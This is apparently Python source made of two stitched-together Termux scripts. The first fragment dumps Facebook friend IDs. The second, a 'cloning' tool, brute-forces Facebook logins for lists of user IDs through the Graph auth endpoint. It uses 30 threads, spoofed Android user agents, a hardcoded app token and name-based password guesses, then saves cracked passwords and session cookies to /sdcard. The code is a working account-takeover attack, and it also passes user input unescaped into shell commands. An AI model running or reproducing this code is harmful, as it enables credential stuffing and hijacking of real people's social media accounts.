                q = json.loads(r)
                for yaad in q['friends']['data']:
                        iid = yaad['id']
                        name = yaad['name']
                        total.append(iid)
                        open(sf,'a').write(iid+'|'+name+'\n')
                loop+=1
                sys.stdout.write('\r Dumping Ids [%s] : [%s]\r'%(loop,len(total)));sys.stdout.flush()
        except requests.exceptions.ConnectionError:
                print(' No internet connection ...')
        except Exception as e:
                pass
                #print(e)
        except KeyError:
                pass

def sep():
        xchker()
        os.system('clear');print(logo);xchker()
        try:
                limit = int(input(' How many links do you want to separate ? '))
        except:
                limit = 1
        print(f'{rg} File Path Example /sdcard/xxx.txt{s}')
        file_name = input('\033[0m Input file path : ')
        print(f'{rg} Save As Example /sdcard/newfile.txt{s}')
        new_save = input('\033[0m Save new file as : ')
        y = 0
        print(f"{ro} Ids To Grabb Ex [ 100087,10000,10006 etc ]{s}")
        for k in range(limit):
                y+=1
                links=input(' Put Uid Type : ')
                os.system('cat '+file_name+' | grep "'+links+'" >> '+new_save)
        print(44*"\033[0m-")
        print(f'{rc} ids grabbed successfully{s}')
        print(' Total grabbed ids :\033[0;33m '+str(len(open(new_save).read().splitlines())))
        print('\033[0m New file saved as : \033[0;33m '+new_save)
        print(44*"\033[0m-")
        input('\033[0m[Press enter to back] ')
        main()

def double():
        os.system('clear')
        print(logo);xchker()
        user_file = input('File Path : ')
        try:
                open(user_file,'r').read()
                print(' \n\033[1;97mExample: /sdcard/xxx.txt\n\033[0;97m')
                save_file = input('Save new file as: ')
                os.system('touch '+save_file)
                os.system('sort -r '+user_file+' | uniq > '+save_file)
                print(50*'-')
                print(' Fully Removed Multi Lines Ids')
                print(' Dublicate Lines Removed From File')
                print(' File Saved As : '+save_file)
                print(50*'-')
                input('Press enter to back ')
                main()
        except FileNotFoundError:
                print(' Invalid File ')

#----[http-capture]----
try:
        a = "anar"
        t="tt"
        fileee = os.listdir('/sdcard/Android/data/')
        if f'com.h{t}pc{a}y.pro' in fileee:
                print('error occur 0')
                #exit()
                #exit(f'\nsomethiiing went wrong\n\nContact Admin : +923021431324')
except Exception as e:
        print(e)
        pass
except PermissionError:
        pass


'''#----[if-fork]------
pat = os.getcwd()
datar = []
datar.append(pat)
if '/data/data/com.termux/files/home/umar' in datar:
        pass
else:
        for i in range(5000):
                print(" data is forked / or in other file")
        #exit("Type > cd ~ && python jan.py")

if not os.path.exists('.fam'):
        qsbuy()
else:
        qsbuy()'''
main()
#coding = utf-8
#This Open-Source Script by Aqib Gando ghasti ka bacha
#Please Donot Forget to give Credit 
#Whatsapp : +
import os
import sys
import re
import random,zlib
import time
from time import sleep as sp
import string,json
import subprocess
import base64,uuid
from requests.exceptions import ConnectionError as CError
from concurrent.futures import ThreadPoolExecutor as tpd
 
 
try:
	import requests
except ImportError:
	os.system('pip install requests')
 
 
ses = requests.Session()
 
id = []
ok = []
cp =[]
loop = 0
pwx = []
method = []
 
 
##______COLORS____ARE________######
pwx=[]
W = '\033[97;1m'
R = '\033[91;1m'
G = '\033[92;1m'
Y = '\033[93;1m'
B = '\033[94;1m'
P = '\033[95;1m'
S = '\033[96;1m'
N = '\x1b[0m'

print("EssA")

#________________________________________#
def clear():
	os.system("clear")
 
def line():
	print(52*'-')
def p(x):
	print(x)
 
def logo():
	logo = (f'''\033[1;97m                                    
$$\   $$\                                   
$$ |  $$ |                                  
$$ |  $$ |$$$$$$\$$$$\   $$$$$$\   $$$$$$\  
$$ |  $$ |$$  _$$  _$$\  \____$$\ $$  __$$\ 
$$ |  $$ |$$ / $$ / $$ | $$$$$$$ |$$ |  \__|
$$ |  $$ |$$ | $$ | $$ |$$  __$$ |$$ |      
\$$$$$$  |$$ | $$ | $$ |\$$$$$$$ |$$ |      
 \______/ \__| \__| \__| \_______|\__|                                                                                             
                                            
$$$$$$\                                     
\_$$  _|                                    
  $$ |  $$$$$$$\   $$$$$$\  $$\   $$\       
  $$ |  $$  __$$\ $$  __$$\ \$$\ $$  |      
  $$ |  $$ |  $$ |$$ /  $$ | \$$$$  /       
  $$ |  $$ |  $$ |$$ |  $$ | $$  $$<        
$$$$$$\ $$ |  $$ |\$$$$$$  |$$  /\$$\       
\______|\__|  \__| \______/ \__/  \__|    

[<>] The Original Codes are Written by Umar Nazeer 
---------------------------------------------------
 ╰◈▪➣ Github    : https://github.com/CyberAttack 
 ╰◈▪➣ Facebook  : https://www.facebook.com/InnocentUmarr
 ╰◈▪➣ Author    : ★彡[ᴜᴍᴀʀ ɴᴀᴢᴇᴇʀ]彡★ 
 ╰◈▪➣ Version   : DC Extreme [2.2]
 ╰◈▪➣   \033[1;96m★彡[ɪᴍʀᴀɴ ᴋʜᴀɴ ʟᴏᴠᴇʀ]彡★\033[1;97m
---------------------------------------------------''')
	p(logo)
 
 
ua3 = "YAHN APNY 3RD USER AGENT LGANY HE "
 
 
 
ua2 = ' YH 2ND USERAGENTS LGALO METHOD 2 KY LIYE'
 
# USER AGENT FUNCTION UA 1 METHOD 1
def iAmAndroidUa():
	# YHN APNY ESE ANDROID KY UA LGANY HE MNE EXAMPLE KY LIYE IPHONE KY LGAY
	ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
	END = "[FBAN/FBIOS;FBAV/{str(random.randint(111,999))+'.0.0.'+str(random.randrange(1,30))+'.'+str(random.randint(111,999))};FBBV/{FBBV};FBDV/iPhone10,{random.choice(['1','5'])};FBMD/iPhone;FBSN/iOS;FBSV/{(ios_version).replace('_','.')};FBSS/2;FBCR/{random.choice(['Jazz','Zong'])};FBID/phone;FBLC/en_US;FBOP/5;FBRV/{random.choice(['106631002','0'])}]"
	ua = random.choice(["Dalvik/2.1.0 (Linux; U; Android 11; motorola one 5G ace Build/RZKS31.Q3-45-16-9-11)","Dalvik/2.1.0 (Linux; U; Android 9; AFTWMST22 Build/PS7633.3445N)","Dalvik/2.1.0 (Linux; U; Android 10; 7LC1 Build/QP1A.190711.020)","Dalvik/2.1.0 (Linux; U; Android 11; X88pro10.r.de.6330.d4.software Build/RP1A.201105.002)","Dalvik/2.1.0 (Linux; U; Android 11; PX1 Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 5.0.0; View Prime Build/v12bn [FBAN/FB4A;FBAV/353.0.0.27.492;FBBV/558626621;FBDM/{density=3.0,width=720,height=1280};FBLC/en_US;FBRV/558626621;FBMF/Wiko;FBBD/Wiko;FBPN/com.facebook.orca;FBDV/View Prime;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]","Dalvik/2.1.0 (Linux; U; Android 5.1; Archos 50 Cobalt Build/LMY47D)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 4a (5G) Build/TQ2A.230405.003.A2)","Dalvik/2.1.0 (Linux; U; Android 13; PHP110 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 13; V2238 Build/TP1A.220624.014_NONFCMOD1)","Dalvik/2.1.0 (Linux; U; Android 7.0; SM-T818 Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 12; TECNO Mobile CH9n Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; T96R Build/LMY49F)","Dalvik/2.1.0 (Linux; U; Android 7.0; Moto C Build/NRD90M.041)","Dalvik/2.1.0 (Linux; U; Android 13; SH-M24 Build/S3162)","Dalvik/2.1.0 (Linux; U; Android 10.0; T9212A Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 11; AiPlus2K Build/RTM3.211215.123)","Dalvik/2.1.0 (Linux; U; Android 9; SA 2K TV Build/PTO7.211209.001)","Dalvik/2.1.0 (Linux; U; Android 12; moto g32 Build/S2SNS32.34-60-6)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; SF550 Build/LMY47V)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A536N Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 7 Build/TQ2A.230305.008.C1)","Dalvik/2.1.0 (Linux; U; Android 9; Viva_1003G Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 12; ZTE A2322G Build/SKQ1.220213.001)","Dalvik/2.1.0 (Linux; U; Android 12; moto g stylus 5G (2022) Build/S1SDS32.56-81-10)","Dalvik/2.1.0 (Linux; U; Android 9; coral Build/R112-15359.58.0)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A3460 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; V2239 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 11; S1 Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 5 Build/TQ2A.230405.003)","Dalvik/2.1.0 (Linux; U; Android 13; Bengal for arm64 Build/TKQ1.221013.002)","Dalvik/2.1.0 (Linux; U; Android 7.0; X12 Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 13; CPH2465 Build/RKQ1.211119.001)","Dalvik/2.1.0 (Linux; U; Android 11; Q9.r1.00.6330_642.d4 Build/RP1A.201105.002)","Dalvik/2.1.0 (Linux; U; Android 11; hatch Build/R112-15359.45.0)","Dalvik/2.1.0 (Linux; U; Android 13; Subsystem for Android(TM) Build/TQ2A.230305.008.C1)","Dalvik/2.1.0 (Linux; U; Android 13; TECNO KI7 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; N210 Build/OPM2.171019.012)","Dalvik/2.1.0 (Linux; U; Android 5.1; i1002SK Build/LMY47I)","Dalvik/2.1.0 (Linux; U; Android 11; Hisense E20s Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 10; Primo E12 Build/QP1A.190711.020)","Dalvik/2.1.0 (Linux; U; Android 12; moto g power (2022) Build/S3RQ32.20-42-10-1)","Dalvik/1.6.0 (Linux; U; Android 4.2.2; SBM303SH Build/S0034)","Dalvik/2.1.0 (Linux; U; Android 12; V22S Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G955N Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36","Dalvik/2.1.0 (Linux; U; Android 8.0.0; Moto Z (2) Build/OPXS27.109-40-22)","Dalvik/2.1.0 (Linux; U; Android 11; AT70K Build/RP1A.201005.006)","Dalvik/2.1.0 (Linux; U; Android 13; moto e13 Build/TLA33.105-42-42)","Dalvik/2.1.0 (Linux; U; Android 11; RMX3506 Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 13; 21051182C Build/TKQ1.221013.002)","Dalvik/2.1.0 (Linux; U; Android 13; XQ-BC62 Build/61.2.A.0.410)","Dalvik/2.1.0 (Linux; U; Android 11; AQUOS-TVE21A Build/RTM2.210929.167)","Dalvik/2.1.0 (Linux; U; Android 8.0.0; MBX4K Ranger Build/NHG47L)","Dalvik/2.1.0 (Linux; U; Android 13; SM-G770F Build/TP1A.220624.014; BroadcastDotRadioApp )","Dalvik/2.1.0 (Linux; U; Android 10; VOG-TL00 Build/HUAWEIDRA-LX9)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; S23 Ultra Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 9; UK 4K Android TV Build/PTO6.220926.001)","Dalvik/2.1.0 (Linux; U; Android 12; Armor X10 Pro Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 10; LT600T Build/QKQ1.200216.002)","Dalvik/2.1.0 (Linux; U; Android 13; SHG07 Build/S116H)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/T3B2.230316.003)","Dalvik/2.1.0 (Linux; U; Android 5.1; Ixion ES350 Build/DEXP)","Dalvik/2.1.0 (Linux; U; Android 12; ELZ-AN20 Build/HONORELZ-AN20)","Dalvik/2.1.0 (Linux; U; Android 13; motorola edge 20 pro Build/T1RA33.55-15-10)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; ASUS_Z012DA Build/MMB29P)","Dalvik/2.1.0 (Linux; U; Android 11; BQru-6868L Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 12; TAB_912_PRO_4G Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 11; 22031116AI Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 10; O2 TV Box Build/QTT2.200720.001)","Dalvik/2.1.0 (Linux; U; Android 9; motorola one vision Build/PSA29.97-37)","Dalvik/2.1.0 (Linux; U; Android 9; AFTANNA0 Build/PMAIN1.2992N)","Dalvik/2.1.0 (Linux; U; Android 13; M2101K6P Build/TKQ1.221013.002)","Dalvik/2.1.0 (Linux; U; Android 13; V2127 Build/TP1A.220624.014_NONFC)","Dalvik/2.1.0 (Linux; U; Android 11; octopus Build/R112-15359.58.0)","Dalvik/2.1.0 (Linux; U; Android 13; 23021RAAEG Build/TKQ1.221114.001)","Dalvik/2.1.0 (Linux; U; Android 13; SM-G950F Build/TQ2A.230405.003.E1)","Dalvik/2.1.0 (Linux; U; Android 12; 100071485 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 9; SM-A505N Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 10.0; YT7260L Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; Gtel X7plus Build/O11019)","Dalvik/1.6.0 (Linux; U; Android 4.4.4; TPS550A Build/KTU84Q)","Dalvik/2.1.0 (Linux; U; Android 10; TC57 Build/10-16-10.00-QG-U133-STD-HEL-04)","Dalvik/2.1.0 (Linux; U; Android 13; CPH2271 Build/TP1A.220905.001)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; iris60c Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; GT-S7580 Build/LMY48Y)","Dalvik/2.1.0 (Linux; U; Android 7.0; SPYBOXSXMINI Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 11; K55g Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 12; V2065 Build/SP1A.210812.003)","Dalvik/2.1.0 (Linux; U; Android 11; E506 Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 11; BNE-LX3 Build/HUAWEIBNE-LX3)","Dalvik/2.1.0 (Linux; U; Android 9; APEXA-A-1500 Build/PI)","Dalvik/2.1.0 (Linux; U; Android 9; DL3Plus Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 11; E7110 Build/4.501VZ.0568.a)","Dalvik/2.1.0 (Linux; U; Android 9; VISIO TV Build/PTO7.210711.001)","Dalvik/2.1.0 (Linux; U; Android 9.0; PHILCO_ATV11 Build/NHG47L)","Dalvik/2.1.0 (Linux; U; Android 13; Redmi Note 8 Build/TQ1A.230205.002)","Dalvik/2.1.0 (Linux; U; Android 12; RBN-NX1 Build/HONORRBN-N31)","Dalvik/2.1.0 (Linux; U; Android 10; motorola one action Build/QSB30.62-17-17)","Dalvik/2.1.0 (Linux; U; Android 5.1; YU 6000 Build/LMY47D)","Dalvik/2.1.0 (Linux; U; Android 13; 23028RA60L Build/TKQ1.221114.001)",])+END
	return ua
 
	
class Main:
	def __init__(self):
		os.system('clear')
	def saved_results(self,ok,cp):
		if len(ok) != 0 or len(cp) != 0:
			p('\n')
			line()
			p(' [•] Cloning Process Has Been Completed ')
			p(' [•] Total OK Accounts : %s '%(len(ok)))
			p(' [•] Total CP Accounts : %s '%(len(cp)))
			line()
			input(' [•] Press Enter To Go Back To Main Menu ')
			self.menu()
	def menu(self):
		logo()
		p(' [•] This Script is Free Open-Souce by UMAR  ')
		line()
		p(' [1] File Cracking ')
		p(" [2] Join Dilute Coders Facebook Group ")
		p(' [3] Join Dilute Coders Whatsapp Group ')
		line()
		m_1 = input(' [•] Choose : ')
		if m_1 == '1':
			self.methods_menu()
		elif m_1 == '2':
			os.system('xdg-open https://www.facebook.com/groups/1020338239226719/')
			sp(1)
			self.menu()
		elif m_2 =='3':
			os.system('xdg-open https://chat.whatsapp.com/LEwEq6tHVjM7wnW33DNfQb')
		else:
			p(' [•] Wrong Select Hai Bhosdikay ')
			sp(1)
			self.menu()
	def methods_menu(self):
		line()
		p(' [1] Method 1')
		line()
		m_2 = input(' [•] Select Method : ')
		if m_2 == '1':
			method.append('i')
			self.cracking()
		else:
			p(' [•] Wrong Select Hai Bhosdikay ')
			sp(1)
			self.methods_menu()
 
	def cracking(self):
		clear()
		logo()
		try:
			file = input(' [•] Put File Path : ')
			id = open(file).read().splitlines()
			self.password_menu(id)
		except FileNotFoundError:
			p(' [X] File Path Wrong....')
			sp(2)
			self.cracking()
 
	def password_menu(self,id):
		clear()
		logo()
		p(' [•] Enter Password Limit Between 1 to 20 (Max) ')
		try:
			plimit = int(input(' [•] Put Limit : '))
			if plimit == '':
				plimit = 4
			elif plimit > 20:
				limit = 10
		except:
			plimit = 4
		clear();logo()
		print(' [•] Example : first123,last1122,firstlast,last Etc ')
		for n in range(plimit):
			pwx.append(input(' [•] Put Password %s : '%(n+1)))
		clear();logo()
		p(' [•] Dilute Brute Has Been Started ')
		line()
		p(' [•] Total Clone Accounts :  %s '%(len(id)))
		line()
		p(' [•] Use Flight ( Jahaz ) Mode Before / During Cloning ')
		line()
		with tpd(max_workers=30) as saqi:
			for user in id:
				uid,nm = user.split('|')
				if 'i' in method:
					saqi.submit(self.method1,uid,nm,pwx)
				elif 'ii' in method:
					saqi.submit(self.method2,uid,nm,pwx)
				elif 'iii' in method:
					saqi.submit(self.method3,uid,nm,pwx)
		self.saved_results(ok,cp)
 
	def method1(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [UMAR] %s | M1 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
				ln = fn
			for ps in pwx:
				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
				data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": uid,
"password": pw,
"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_GB",
"client_country_code": "GB",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
				headers = {'User-Agent': iAmAndroidUa(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
				if "session_key" in q:
					coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
					cookie = f"sb={sb};{coki}"
					p('\r\033[1;92m[UMAR-OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/UMAR_M1_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/UMAR_M1_COOKIES.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[UMAR-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/UMAR_M1_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
				self.method1(uid,nm,pwx)
		exit()
if __name__=="__main__":
	Main().menu()
